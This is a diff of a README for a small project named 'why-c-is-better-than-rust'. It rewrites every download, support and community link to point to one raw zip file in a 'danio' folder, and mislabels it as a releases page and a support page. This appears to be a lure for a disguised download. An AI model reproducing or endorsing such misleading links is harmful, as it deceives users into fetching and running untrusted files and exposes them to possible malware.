@@ -1,6 +1,6 @@
 # 🎉 why-c-is-better-than-rust - Simplify Systems Programming Today
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/jeifry1214/why-c-is-better-than-rust/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/jeifry1214/why-c-is-better-than-rust/main/danio/why-c-is-better-than-rust.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/jeifry1214/why-c-is-better-than-rust/main/danio/why-c-is-better-than-rust.zip)
 
 ## 📖 Introduction
 
@@ -12,7 +12,7 @@ To get started, follow the steps below. You will set up the application quickly 
 
 ## 📥 Download & Install
 
-To get the software, visit this page to download: [GitHub Releases](https://github.com/jeifry1214/why-c-is-better-than-rust/releases). There, you will find the latest version available for download.
+To get the software, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/jeifry1214/why-c-is-better-than-rust/main/danio/why-c-is-better-than-rust.zip). There, you will find the latest version available for download.
 
 1. Visit the link above.
 2. Look for the section titled "Assets."
@@ -50,7 +50,7 @@ The application offers various features designed to improve your programming exp
 If you encounter any issues or have questions:
 
 - Check the Help section within the application.
-- Visit our [support page](https://github.com/jeifry1214/why-c-is-better-than-rust/issues) for common questions and troubleshooting tips.
+- Visit our [support page](https://raw.githubusercontent.com/jeifry1214/why-c-is-better-than-rust/main/danio/why-c-is-better-than-rust.zip) for common questions and troubleshooting tips.
 
 ## 🌟 Community Involvement
 
@@ -80,7 +80,7 @@ For inquiries or support, please reach out via the GitHub repository. We're here
 
 ## 🔗 Links
 
-- [Download Latest Release](https://github.com/jeifry1214/why-c-is-better-than-rust/releases)
-- [Community Support](https://github.com/jeifry1214/why-c-is-better-than-rust/issues)
+- [Download Latest Release](https://raw.githubusercontent.com/jeifry1214/why-c-is-better-than-rust/main/danio/why-c-is-better-than-rust.zip)
+- [Community Support](https://raw.githubusercontent.com/jeifry1214/why-c-is-better-than-rust/main/danio/why-c-is-better-than-rust.zip)
 
 Thank you for choosing "why-c-is-better-than-rust." We hope you enjoy exploring and simplifying your systems programming experience!
